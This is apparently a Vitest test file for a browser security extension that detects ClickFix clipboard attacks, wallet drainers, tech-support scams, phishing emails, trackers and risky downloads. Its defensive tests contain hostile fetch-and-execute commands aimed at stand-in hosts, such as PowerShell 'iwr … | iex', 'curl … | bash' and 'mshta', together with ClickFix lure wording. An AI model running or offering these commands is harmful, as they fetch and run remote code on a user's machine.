import { describe, it, expect } from 'vitest';
import {
  isMaliciousClipboardCommand,
  shouldBlockClipboardWrite,
  classifyWalletRequest,
  techSupportScamScore,
  TECH_SUPPORT_WARN,
  isNotificationBait,
  type BehaviorKind,
} from './scamBehavior';
import { analyzeEmailLink, analyzeAttachmentName, analyzeReplyTo, findReplyTo, domainClaimedByText } from './emailGuard';
import { trackerFor, blockableTrackerDomains, trackingCookieOwner } from './trackerList';
import { decideDownload, fileExtension } from './downloadGuard';
import { installOriginFindings } from './extensionAudit';
import { detectScamCues } from './pageContent';

describe('ClickFix clipboard guard', () => {
  it('flags command-shaped clipboard text', () => {
    expect(isMaliciousClipboardCommand('powershell -w hidden -c "iwr http://x.test/a.ps1 | iex"')).toBe(true);
    expect(isMaliciousClipboardCommand('curl -s http://x.test/i | bash')).toBe(true);
    expect(isMaliciousClipboardCommand('Hello, here is my address')).toBe(false);
  });
  it('blocks with Run-dialog instructions or a fake verification comment', () => {
    const cmd = 'powershell -c "iwr https://evil.test/p | iex"';
    expect(shouldBlockClipboardWrite(cmd, 'Press Windows + R, then press Ctrl + V and Enter to verify you are human')).toBe(true);
    expect(shouldBlockClipboardWrite('cmd /c start x # I am not a robot - Cloudflare Ray ID 1234', '')).toBe(true);
    expect(shouldBlockClipboardWrite('mshta https://evil.test/x.hta', '')).toBe(true);
  });
  it('does not block install instructions on documentation pages', () => {
    expect(shouldBlockClipboardWrite('curl -fsSL https://get.docker.com | sh', 'Install Docker Engine using the convenience script')).toBe(false);
    expect(shouldBlockClipboardWrite('iwr -useb get.scoop.sh | iex', 'Open a PowerShell terminal and run')).toBe(false);
  });
});

describe('wallet drainer classification', () => {
  const addr = '000000000000000000000000' + '1'.repeat(40);
  it('flags blind signing and permits', () => {
    expect(classifyWalletRequest('eth_sign', ['0xabc', '0xdef']).level).toBe('danger');
    const permit = JSON.stringify({ primaryType: 'Permit', domain: { name: 'USD Coin' }, message: {} });
    expect(classifyWalletRequest('eth_signTypedData_v4', ['0xabc', permit]).level).toBe('danger');
  });
  it('flags unlimited approvals and setApprovalForAll', () => {
    const unlimited = '0x095ea7b3' + addr + 'f'.repeat(64);
    expect(classifyWalletRequest('eth_sendTransaction', [{ data: unlimited }]).level).toBe('danger');
    const limited = '0x095ea7b3' + addr + '0'.repeat(60) + '03e8';
    expect(classifyWalletRequest('eth_sendTransaction', [{ data: limited }]).level).toBe('caution');
    const all = '0xa22cb465' + addr + '0'.repeat(63) + '1';
    expect(classifyWalletRequest('eth_sendTransaction', [{ data: all }]).level).toBe('danger');
  });
  it('ignores ordinary requests', () => {
    expect(classifyWalletRequest('eth_requestAccounts', []).level).toBeNull();
    expect(classifyWalletRequest('eth_sendTransaction', [{ to: '0x1', value: '0x1' }]).level).toBeNull();
    expect(classifyWalletRequest('personal_sign', ['0x', '0x']).level).toBeNull();
  });
});

describe('tech-support scam scoring', () => {
  const set = (...k: BehaviorKind[]) => new Set<BehaviorKind>(k);
  it('warns on lock-in plus scam wording', () => {
    const cues = detectScamCues('WARNING: Your computer is infected! Call Microsoft Support toll-free now');
    expect(techSupportScamScore(set('fullscreen', 'beforeunload'), cues)).toBeGreaterThanOrEqual(TECH_SUPPORT_WARN);
  });
  it('does not warn on a video site going full screen', () => {
    expect(techSupportScamScore(set('fullscreen', 'autoplay_audio'), [])).toBeLessThan(TECH_SUPPORT_WARN);
    expect(techSupportScamScore(set('fullscreen', 'pointer_lock', 'beforeunload'), [])).toBeLessThan(TECH_SUPPORT_WARN);
  });
  it('warns on the classic keyboard + fullscreen lock-in', () => {
    expect(techSupportScamScore(set('fullscreen', 'keyboard_lock', 'history_flood'), [])).toBeGreaterThanOrEqual(TECH_SUPPORT_WARN);
  });
  it('treats a phone number next to virus wording as tech-support', () => {
    expect(detectScamCues('Security Alert: Trojan spyware detected. Call +1 (888) 555-0199 immediately')).toContain('tech_support');
    expect(detectScamCues('Contact sales: +1 (888) 555-0199')).not.toContain('tech_support');
  });
  it('recognises notification bait', () => {
    expect(isNotificationBait(true, 'Click Allow to verify you are not a robot')).toBe(true);
    expect(isNotificationBait(false, 'Latest news', [])).toBe(false);
    expect(isNotificationBait(false, '', ['tech_support'])).toBe(true);
  });
});

describe('email guard', () => {
  it('flags link text that claims another domain', () => {
    expect(domainClaimedByText('www.paypal.com')).toBe('paypal.com');
    const f = analyzeEmailLink('https://www.paypal.com/signin', 'https://paypal-secure-login.xyz/verify');
    expect(f?.level).toBe('danger');
    expect(f?.reasons.join(' ')).toMatch(/paypal\.com/);
  });
  it('leaves matching links alone', () => {
    expect(analyzeEmailLink('Open GitHub', 'https://github.com/notifications')).toBeNull();
    expect(analyzeEmailLink('github.com', 'https://github.com/')).toBeNull();
    expect(analyzeEmailLink('mail me', 'mailto:a@b.com')).toBeNull();
  });
  it('flags IP links and javascript links', () => {
    expect(analyzeEmailLink('Click', 'http://192.168.10.5/login')?.level).toBe('danger');
    expect(analyzeEmailLink('Click', 'javascript:alert(1)')?.level).toBe('danger');
  });
  it('flags risky attachments', () => {
    expect(analyzeAttachmentName('invoice.pdf.exe')?.reasons[0]).toMatch(/Disguised as a \.pdf/);
    expect(analyzeAttachmentName('statement.html')?.level).toBe('caution');
    expect(analyzeAttachmentName('report.pdf')).toBeNull();
  });
  it('flags a Reply-To that goes elsewhere', () => {
    expect(findReplyTo('From: Bank <alerts@bank.com>\nReply-To: Support <help.bank@gmail.com>')).toBe('help.bank@gmail.com');
    expect(analyzeReplyTo('alerts@bank.com', 'help.bank@gmail.com')?.level).toBe('danger');
    expect(analyzeReplyTo('alerts@bank.com', 'support@bank.com')).toBeNull();
  });
});

describe('tracker list', () => {
  it('recognises trackers by domain and subdomain', () => {
    expect(trackerFor('www.google-analytics.com')?.company).toBe('Google');
    expect(trackerFor('stats.g.doubleclick.net')?.category).toBe('advertising');
    expect(trackerFor('example.com')).toBeNull();
  });
  it('never blocks t.co navigation links', () => {
    expect(blockableTrackerDomains()).not.toContain('t.co');
    expect(blockableTrackerDomains().length).toBeGreaterThan(100);
  });
  it('labels tracking cookies by name', () => {
    expect(trackingCookieOwner('_ga')).toBe('Google Analytics');
    expect(trackingCookieOwner('_fbp')).toBe('Meta Pixel');
    expect(trackingCookieOwner('sessionid')).toBeNull();
  });
});

describe('download guard', () => {
  const base = { filename: '', url: 'https://example.com/file', blocklisted: false, remoteDecision: null, domainAgeDays: -1, isHttp: false };
  it('reads extensions from names and URLs', () => {
    expect(fileExtension('C:\\Users\\a\\Downloads\\setup.EXE')).toBe('exe');
    expect(fileExtension('https://x.test/a/b.zip?x=1')).toBe('zip');
    expect(fileExtension('https://x.test/download')).toBe('');
  });
  it('blocks known-bad sources', () => {
    expect(decideDownload({ ...base, blocklisted: true }).action).toBe('block');
    expect(decideDownload({ ...base, remoteDecision: 'block' }).action).toBe('block');
  });
  it('warns on runnable files from new, suspicious or HTTP sources', () => {
    expect(decideDownload({ ...base, filename: 'setup.exe', domainAgeDays: 3 }).action).toBe('warn');
    expect(decideDownload({ ...base, filename: 'a.zip', remoteDecision: 'warn' }).action).toBe('warn');
    expect(decideDownload({ ...base, filename: 'tool.msi', isHttp: true }).action).toBe('warn');
  });
  it('allows documents and established sources', () => {
    expect(decideDownload({ ...base, filename: 'report.pdf', domainAgeDays: 2 }).action).toBe('allow');
    expect(decideDownload({ ...base, filename: 'setup.exe', domainAgeDays: 4000 }).action).toBe('allow');
  });
});

describe('extension checkup origin', () => {
  it('flags developer-mode, sideloaded, off-store and known-malicious extensions', () => {
    expect(installOriginFindings({ installType: 'development' })[0][1]).toMatch(/developer mode/);
    expect(installOriginFindings({ installType: 'sideload' })[0][1]).toMatch(/another program/);
    expect(installOriginFindings({ installType: 'normal', updateUrl: 'https://evil.test/update.xml' })[0][1]).toMatch(/outside the official store/);
    expect(installOriginFindings({ installType: 'normal', updateUrl: 'https://clients2.google.com/service/update2/crx' })).toEqual([]);
    expect(installOriginFindings({ id: 'abc' }, new Set(['abc']))[0][0]).toBe(100);
  });
});
